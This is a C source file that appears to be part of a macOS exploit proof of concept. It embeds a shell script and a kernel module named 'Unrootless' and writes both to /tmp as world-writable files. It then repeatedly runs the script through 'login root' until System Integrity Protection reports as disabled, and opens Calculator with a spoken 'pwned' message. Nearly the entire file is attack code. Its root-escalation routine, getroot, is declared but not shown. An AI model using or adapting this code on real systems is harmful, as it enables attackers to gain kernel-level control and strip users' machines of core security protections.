#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

void getroot();

__asm__("_script: .incbin \"" CURRENT_DIR "/kext.sh\"\n.byte 0");
__asm__("_module: .incbin \"" CURRENT_DIR "/Unrootless\"\n_module_end:");
extern char script[], module[], module_end[];

void root_to_kernel() {
	int fd = open("/tmp/script", O_CREAT|O_WRONLY, 0777);
	write(fd, script, strlen(script));
	close(fd);

	fd = open("/tmp/Unrootless", O_CREAT|O_WRONLY, 0777);
	write(fd, module, module_end - module);
	close(fd);

	while(system("csrutil status | grep disabled"))
		system("echo bash /tmp/script | login root 2>/tmp/log >/tmp/log");

	system("open /tmp/sayhi.command");
}

int main() {
	system("open /System/Applications/Calculator.app");
	system("say 'hello. you have benn pwned.'");

	getroot();
	root_to_kernel();
	return 0;
}
